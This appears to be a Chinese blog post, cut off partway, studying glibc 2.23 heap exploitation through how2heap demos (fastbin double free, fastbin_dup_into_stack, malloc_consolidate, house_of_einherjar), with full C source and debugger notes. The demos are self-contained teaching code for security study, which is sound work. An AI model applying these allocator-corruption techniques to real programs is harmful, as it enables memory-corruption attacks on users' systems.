<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="Closure" />
  <meta name="description" content="" />
  <meta name="google-site-verification" content="ume8wxFIzFnN-uS2NK6TLbEnB0OL8U3QYLpG-0v0NPM" />
  
  
  <title>
    
      How2heap Glibc2.23 
      
      
      |
    
     Closure
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Closure</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">主页</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">归档</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">关于我</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">How2heap Glibc2.23</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2022-06-22 17:20:42
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="标签"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
                    #pwn_堆
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="Glibc-2-23"><a href="#Glibc-2-23" class="headerlink" title="Glibc_2.23"></a>Glibc_2.23</h1><p>编译与替换默认libc</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-g</span> xxx.c <span class="token parameter variable">-o</span> clo

patchelf --set-interpreter ~/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath ~/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 clo</code></pre>



<h3 id="fastbin-dup-c"><a href="#fastbin-dup-c" class="headerlink" title="fastbin_dup.c"></a>fastbin_dup.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates a simple double-free attack with fastbins.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 3 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// free(a);</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, instead, we'll free %p.\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we can free %p again, since it's not the head of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span>a <span class="token operator">==</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在18行下断点：</p>
<p>首先创建了3个chunk，并将chunk的data指针赋给a，b，c</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527125813098.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527125646593.png"></p>
<p>在27行下断点：</p>
<p>先释放chunk a，再释放chunk b</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527142100956.png"></p>
<p>在30行下断点：</p>
<p>由于chunk a释放后指针未清空，再次释放chunk a</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527142458218.png"></p>
<p>运行至结束：</p>
<p>再次申请3个chunk</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527143340377.png"></p>
<p>&#x3D;&#x3D;&#x3D;》chunk1和chunk3申请的是同一个chunk</p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>由于释放堆块后未及时清空堆块指针导致指针重利用</p>
<h3 id="fastbin-dup-consolidate-c"><a href="#fastbin-dup-consolidate-c" class="headerlink" title="fastbin_dup_consolidate.c"></a>fastbin_dup_consolidate.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This is a powerful technique that bypasses the double free check in tcachebin."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fill up the tcache list to force the fastbin usage...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocate another chunk of the same size p1=%p \n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing p1 will add this chunk to the fastbin list...\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocating a tcache-sized chunk (p3=%p)\n"</span><span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"will trigger the malloc_consolidate and merge\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the fastbin chunks into the top chunk, thus\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 and p3 are now pointing to the same chunk !\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">assert</span><span class="token punctuation">(</span>p1 <span class="token operator">==</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Triggering the double free vulnerability!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">void</span> <span class="token operator">*</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">assert</span><span class="token punctuation">(</span>p4 <span class="token operator">==</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The double free added the chunk referenced by p1 \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"to the tcache thus the next similar-size malloc will\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"point to p3: p3=%p, p4=%p\n\n"</span><span class="token punctuation">,</span>p3<span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>首先在14行下断点：</p>
<p>使用calloc创建一个chunk p1：清空data区域</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527144021455.png"></p>
<p>16行下断点：</p>
<p>释放chunk p1：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527144134343.png"></p>
<p>在22行下断点：</p>
<p>申请一个0x400大小的chunk p3</p>
<p>此时fastbin中存放着p1，此时申请一块大于fastbin范围的chunk，会将fastbin中的chunk放入small bin</p>
<p>&#x3D;&#x3D;&gt;</p>
<p>chunk转移过程：</p>
<p>fastbin中的chunk通过malloc_consolidate函数转移到unsorted bin中&#x3D;&#x3D;》</p>
<p>malloc函数在unsorted bin中寻找符合大小的chunk，此时在其中的p1太小不够，转移至small bin中</p>
<p>由于该free chunk又与top chunk相邻，导致与top chunk和并，p3从top chunk中来</p>
<p>由于使用的malloc，chunk中的数据没有清空（old top chunk的数据也保留）</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527144409632.png"></p>
<p>27行下断点：</p>
<p>由于此时fastbin中并无p1，并且指针未清空，实现再一次释放p1，实现double free</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527145012086.png"></p>
<p>此时的p1和p3：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527145300495.png"></p>
<p>运行至结束：</p>
<p>申请一个0x400大小的chunk p4：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527153724869.png"></p>
<h3 id="fastbin-dup-into-stack-c"><a href="#fastbin-dup-into-stack-c" class="headerlink" title="fastbin_dup_into_stack.c"></a>fastbin_dup_into_stack.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span>
	       <span class="token string">"returning a pointer to a controlled location (in this case, the stack).\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> stack_var<span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The address we want malloc() to return is %p.\n"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 3 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// free(a);</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, instead, we'll free %p.\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we can free %p again, since it's not the head of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p, %p, %p ]. "</span>
		<span class="token string">"We'll now carry out our attack by modifying data at %p.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p ].\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we have access to %p while it remains at the head of the free list.\n"</span>
		<span class="token string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span>
		<span class="token string">"so that malloc will think there is a free chunk there and agree to\n"</span>
		<span class="token string">"return a pointer to it.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	stack_var <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">*</span>d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"4th malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>首先创建3个chunk：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527161435132.png"></p>
<p>释放chunk a，再释放chunk b，再利用double free释放chunk a：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527161625157.png"></p>
<p>此时申请出chunk d&#x3D;&#x3D;》获得fastbin中chunk a的控制权：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527162746204.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527162801083.png"></p>
<p>通过对chunk d进行修改以达到篡改fastbin 中chunk a的fd使其指向目的地址</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527163345537.png"></p>
<p>运行至结束：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220527163456012.png"></p>
<p>获得了目标地址的控制权</p>
<h3 id="house-of-einherjar-c"><a href="#house-of-einherjar-c" class="headerlink" title="house_of_einherjar.c"></a>house_of_einherjar.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>

<span class="token comment">/*
   Credit to st4g3r for publishing this technique
   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to House of Einherjar!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tested in Ubuntu 16.04 64bit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWe allocate 0x38 bytes for 'a'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a: %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n"</span><span class="token punctuation">,</span> real_a_size<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// create a fake chunk</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"However, you can also create the chunk in the heap or the bss, as long as you know its address\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(although we could do the unsafe unlink technique here in some scenarios)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token class-name">size_t</span> fake_chunk<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	fake_chunk<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span> <span class="token comment">// prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size</span>
